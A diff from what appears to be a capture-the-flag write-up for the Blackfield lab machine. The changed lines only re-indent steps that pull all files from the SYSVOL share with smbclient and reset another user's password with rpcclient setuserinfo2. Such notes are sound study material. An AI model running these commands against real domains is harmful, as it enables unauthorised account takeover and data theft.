@@ -112,17 +112,17 @@ SMB/LDAP:
         smbclient //10.10.10.192/SYSVOL -U'blackfield.local\support'
 
 *******************************************************************************
-    We Upload everything we can:
-        smb: \> mask ""
-        smb: \> recurse
-        smb: \> prompt
-        smb: \> mget *
-    We found Nothing special ......
+        We Upload everything we can:
+            smb: \> mask ""
+            smb: \> recurse
+            smb: \> prompt
+            smb: \> mget *
+        We found Nothing special ......
 
-    We will try to modify other users password via rpcclient:
-        rpcclient $> setuserinfo2 audit2020 23 '#00^BlackKnight'
+        We will try to modify other users password via rpcclient:
+            rpcclient $> setuserinfo2 audit2020 23 '#00^BlackKnight'
 
-    It seems to work
+        It seems to work
 *******************************************************************************
 
     Now we have access to the "forensic" SMB:
